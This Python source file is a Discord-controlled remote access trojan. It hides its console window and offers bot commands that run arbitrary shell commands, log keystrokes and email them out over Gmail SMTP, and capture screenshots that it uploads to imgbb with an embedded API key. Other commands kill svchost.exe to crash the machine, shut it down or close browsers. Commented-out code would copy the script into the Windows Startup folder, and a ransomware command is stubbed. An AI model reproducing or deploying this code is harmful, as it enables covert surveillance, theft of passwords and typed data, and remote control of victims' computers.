from email import message
import pyautogui
import PIL
import pyscreenshot
import imgbbpy
from glob import escape
from pdb import Restart
from pickle import NONE, TRUE
from types import NoneType
import win32console
import getpass
import smtplib
from numpy import char
import sys
from pynput.keyboard import Key, Listener
import win32gui
ventana =win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)
import pynput
from pynput.keyboard import Key, Listener
import smtplib, ssl
import psutil
import logging
import re
import json

from urllib.request import Request, urlopen

import discord
from discord.ext import commands
import datetime
import os
from urllib import parse, request
import re
import pathlib
import shutil
import subprocess as sp
import random
import requests
user = getpass.getuser()
from requests import get



bot = commands.Bot(command_prefix='!', description="This is Hacker bot")
ipl = get('https://api.ipify.org').text
script = __file__
a=0
##keylogger
email = "TU_CORREO"
password = "TU_CONTRASENA"
print(script)
server = smtplib.SMTP_SSL('smtp.gmail.com',465)
server.login(email,password)

full_log = ''
word = ''
email_char_limit = 10
##endkeylogger
#final_path = r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(user)
#if os.path.exists(r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bsod-client.exe".format(user)):
#   a = 1
#else:
#  print(a)
#  shutil.move(script, final_path)
#pc = r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\".format(user)
#pw = r"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bsod-client.exe".format(user)
#if os.path.isfile(pw):
#    a = 2
#else:
#    shutil.move(script, pc)
    


@bot.command()
async def purge(ctx): 
 await ctx.send('cleaning')
 await ctx.channel.purge(limit=None)
 await ctx.send('Historial borrado!')
@bot.command()
async def targets(ctx):
 await ctx.send(f'response from {ipl} in machine {user}')
@bot.command()
async def bluescreen(ctx, ip=None):
 if ip==None:
   await ctx.send("Escribe una ip")
 elif ip==ipl:
  os.system("taskkill.exe /f /im svchost.exe")
  await ctx.send("Success")
@bot.command()
async def startloggin(ctx, ip=None):
 if ip==None:
   await ctx.send("Escribe una ip")
 elif ip==ipl:
     await ctx.send("Started loggin {}".format(ipl))
     def on_press(key):
         global word
         global full_log
         global email
         global email_char_limit
         global ctx

         if key == Key.space or key == Key.enter:
             word +=' '
             full_log+= word
             word = ''
             if len(full_log)>= email_char_limit:
                 send_log()
                 full_log = ''
         elif key == Key.shift_l or key == Key.shift_r:
             return
         elif key == Key.backspace:
             word = word[:-1]
         else:
             char = f'{key}'
             char = char[1:-1]
             word += char
         if key == Key.esc:
             return False
     def send_log():
         server.sendmail(
             email,
             email,
             full_log,
             

         )

     with Listener( on_press=on_press)as listener:
          listener.join()
@bot.command(case_insensitive=True)
async def commandexec(ctx, ip=None, command=None):
 if ip==None:
   await ctx.send("Escribe una ip")
 elif ip==ipl:
     if command==None:
         await ctx.send("Escribe un comando")
     else:
         output = sp.getoutput(command)
         await ctx.send(output)
        
@bot.command(case_insensitive=True)
async def apagar(ctx, ip=None):
 if ip==None:
   await ctx.send("Escribe una ip")
 elif ip==ipl:
     os.system("shutdown /s /t 1")


@bot.command(case_insensitive=True)
async def panic(ctx,ip=None):
    if ip==None:
        await ctx.send("Escribe una ip")
    elif ip ==ipl:
        pan = "taskkill.exe /f /im bsod-client.exe"
        output1 = sp.getoutput(pan)
        await ctx.send(output1)

@bot.command(case_insensitive=True)
async def msgbox(ctx, ip=None, msg=None):
    if ip==None:
        await ctx.send("Escriba una ip")
    elif ip == ipl:
        if msg ==None:
            await ctx.send("Digite el mensaje a mostrar")
        else:
            os.system(f'mshta vbscript:Execute("msgbox ""{msg}"":close")')
@bot.command()
async def helpbot(ctx):
    await ctx.send("Help\n >purge to clean history\n >targets to see machines infected\n >bluescreen to drop an bluescreen\n >startloggin to start the keylogger\n >commandexec to execute a command\n >panic to close the rat\n >apagar turn off computer\n >msgbox show any message you want\n >nk cerrar chrome(c) o edge(e)\n >pic to take an screenshot \n >rans Soon...")

@bot.command()
async def rans(ctx, ip=None, uls=None):
    if ip == None:
        await ctx.send("Digite una ip valida")
    elif uls == None or uls != user:
        await ctx.send("Digite un usuario valido")
    elif ip == ipl and uls == user:
        await ctx.send("Funcionando")

@bot.command(case_insensitive=True)
async def nk(ctx,ip=None,navegador=None):
    if ip==None:
        await ctx.send("Escribe una ip")
    elif ip ==ipl:
        if navegador==None:
            await ctx.send("Escriba el navegador a cerrar Chrome(c), Edge(e)")
        elif navegador=="c":
            os.system("taskkill.exe /f /im chrome.exe")
        elif navegador=="e":
            os.system("taskkill.exe /f /im msedge.exe")
        else:
            await ctx.send("Navegador no valido")

@bot.command()
async def pic(ctx,ip=None):
    if ip==None:
        await ctx.send("Escribe una ip")
    elif ip ==ipl:
        rm = random.randint(0,999999)
        screenshot = pyautogui.screenshot()
        path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{rm}.jpg"
        screenshot.save(path)
        client = imgbbpy.SyncClient('07339b4232e52fe5ca8fc815f62134b0')
        image = client.upload(file=path)
        await ctx.send(image.url)
        os.remove(path)
        await ctx.send(f"Removed {path}")





@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="Hacking pc", url="https://instagram.com/nicolas.5301"))
    print('Hacking...')


   

bot.run('')
